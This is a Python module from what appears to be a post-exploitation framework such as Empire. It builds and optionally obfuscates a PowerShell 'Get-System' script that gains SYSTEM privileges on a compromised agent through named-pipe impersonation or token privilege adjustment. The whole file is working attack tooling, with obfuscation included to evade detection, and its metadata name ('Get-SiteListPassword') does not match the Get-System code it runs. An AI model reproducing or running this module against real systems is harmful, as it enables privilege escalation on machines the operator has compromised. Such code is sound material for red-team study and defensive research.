import os.path
from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Get-SiteListPassword',

            'Author': ['@harmj0y', '@mattifestation'],

            'Description': ("Gets SYSTEM privileges with one of two methods."),

            'Background' : False,

            'OutputExtension' : None,

            'NeedsAdmin' : True,

            'OpsecSafe' : False,

            'MinPSVersion' : '2',

            'Comments': [
                'https://github.com/rapid7/meterpreter/blob/2a891a79001fc43cb25475cc43bced9449e7dc37/source/extensions/priv/server/elevate/namedpipe.c',
                'https://github.com/obscuresec/shmoocon/blob/master/Invoke-TwitterBot',
                'http://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/',
                'http://clymb3r.wordpress.com/2013/11/03/powershell-and-token-impersonation/'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Technique' : {
                'Description'   :   "Technique to use, 'NamedPipe' for service named pipe impersonation or 'Token' for adjust token privs.",
                'Required'      :   False,
                'Value'         :   'NamedPipe'
            },
            'ServiceName' : {
                'Description'   :   "Optional service name to used for 'NamedPipe' impersonation.",
                'Required'      :   False,
                'Value'         :   ''
            },
            'PipeName' : {
                'Description'   :   "Optional pipe name to used for 'NamedPipe' impersonation.",
                'Required'      :   False,
                'Value'         :   ''
            },
            'RevToSelf' : {
                'Description'   :   "Switch. Reverts the current thread privileges.",
                'Required'      :   False,
                'Value'         :   ''
            },
            'WhoAmI' : {
                'Description'   :   "Switch. Display the credentials for the current PowerShell thread.",
                'Required'      :   False,
                'Value'         :   ''
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):

        # read in the common module source code
        moduleSource = self.mainMenu.installPath + "/data/module_source/privesc/Get-System.ps1"
        if obfuscate:
            moduleSource = self.mainMenu.installPath + "/data/obfuscated_module_source/privesc/Get-System.ps1"
            if not self.is_obfuscated():
                self.obfuscate(obfuscationCommand=obfuscationCommand)
        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()

        script = moduleCode

        script += "Get-System "

        if self.options['RevToSelf']['Value'].lower() == "true":
            script += " -RevToSelf"
        elif self.options['WhoAmI']['Value'].lower() == "true":
            script += " -WhoAmI"
        else:
            for option,values in self.options.iteritems():
                if option.lower() != "agent":
                    if values['Value'] and values['Value'] != '':
                        if values['Value'].lower() == "true":
                            # if we're just adding a switch
                            script += " -" + str(option)
                        else:
                            script += " -" + str(option) + " " + str(values['Value'])

            script += "| Out-String | %{$_ + \"`n\"};"
            script += "'Get-System completed'"

        return script

    def obfuscate(self, obfuscationCommand="", forceReobfuscation=False):
        if self.is_obfuscated() and not forceReobfuscation:
            return

        # read in the common module source code
        moduleSource = self.mainMenu.installPath + "/data/module_source/privesc/Get-System.ps1"
        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()

        # obfuscate and write to obfuscated source path
        obfuscatedSource = self.mainMenu.installPath + "/data/obfuscated_module_source/privesc/Get-System.ps1"
        obfuscatedCode = helpers.obfuscate(psScript=moduleCode, installPath=self.mainMenu.installPath, obfuscationCommand=obfuscationCommand)
        try:
            f = open(obfuscatedSource, 'w')
        except:
            print helpers.color("[!] Could not read obfuscated module source path at: " + str(obfuscatedSource))
            return ""
        f.write(obfuscatedCode)
        f.close()

    def is_obfuscated(self):
        obfuscatedSource = self.mainMenu.installPath + "/data/obfuscated_module_source/privesc/Get-System.ps1"
        return os.path.isfile(obfuscatedSource)
